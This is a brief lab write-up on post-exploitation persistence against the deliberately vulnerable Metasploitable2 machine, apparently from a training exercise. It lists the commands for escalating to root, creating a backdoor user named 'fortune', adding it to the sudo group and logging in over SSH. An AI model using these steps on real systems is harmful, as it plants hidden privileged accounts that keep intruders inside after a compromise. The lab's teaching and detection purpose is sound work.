Post-Exploitation Phase: User Persistence
Creation
Objective
To establish persistent access on the compromised system by creating a new administrative user
account on the target machine, ensuring continued access beyond the initial exploitation phase.
Target Environment
Target System: Metasploitable2
Attack Platform: Metasploit Framework
Access Level: Post-exploitation shell / Meterpreter session
Procedure
Accessing the Target System
shell
Privilege Enumeration
whoami
id
Privilege Escalation
sudo su
Creating a New User Account
useradd -m -s /bin/bash fortune
Setting User Password
passwd fortune
Granting Administrative Privileges
usermod -aG sudo fortune
Verification of User Creation
id fortune
Testing Persistent Access
ssh fortune@<target-ip>
Results
A new administrative user account was successfully created. The account was granted elevated
privileges and persistent access was confirmed.
Discussion
This demonstrates a common post-exploitation persistence technique where attackers maintain
long-term access by creating privileged accounts.
Conclusion
The lab successfully achieved persistence, highlighting the importance of monitoring unauthorized
account creation.
Ethical Consideration
This activity was conducted strictly within a controlled lab environment for educational purposes.
